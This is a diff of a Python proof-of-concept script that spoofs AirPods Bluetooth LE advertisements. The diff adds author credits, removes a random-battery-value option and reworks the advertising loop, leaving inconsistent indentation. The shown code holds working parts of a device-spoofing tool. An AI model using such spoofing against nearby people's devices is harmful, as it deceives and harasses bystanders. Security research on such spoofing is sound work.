@@ -1,4 +1,14 @@
 #!/usr/bin/env python3
+
+# ------ Script Author(s) Info --------
+# Author: Steven Hullander
+# Twitter: https://twitter.com/TheSweatySteve
+
+# Author: Zach Phillips
+# Twitter: https://twitter.com/zach_phillips06
+
+
+# ------ Original Author(s) Info --------
 # Author: Dmitry Chastuhin
 # Twitter: https://twitter.com/_chipik
 
@@ -19,7 +29,6 @@ AirPods advertise spoofing PoC
 
 parser = argparse.ArgumentParser(description=help_desc, formatter_class=argparse.RawTextHelpFormatter)
 parser.add_argument('-i', '--interval', default=200, type=int, help='Advertising interval')
-parser.add_argument('-r', '--random', action='store_true', help='Send random charge values')
 args = parser.parse_args()
 
 dev_id = 0  # the bluetooth device is hci0
@@ -38,22 +47,8 @@ except:
     raise
 
 print("Start advertising...")
-if args.random:
-    while True:
-        try:
-            sock = bluez.hci_open_dev(dev_id)
-        except:
-            print("Cannot open bluetooth device %i" % dev_id)
-            raise
-        left_speaker = (random.randint(1, 100),)
-        right_speaker = (random.randint(1, 100),)
-        case = (random.randint(128, 228),)
-        start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
-                             data=(data1 + left_speaker + right_speaker + case + data2))
-        sleep(2)
-        stop_le_advertising(sock)
-else:
-    try:
+while True:
+   try:
         start_le_advertising(sock, adv_type=0x03, min_interval=args.interval, max_interval=args.interval,
                              data=(data1 + left_speaker + right_speaker + case + data2))
         while True:
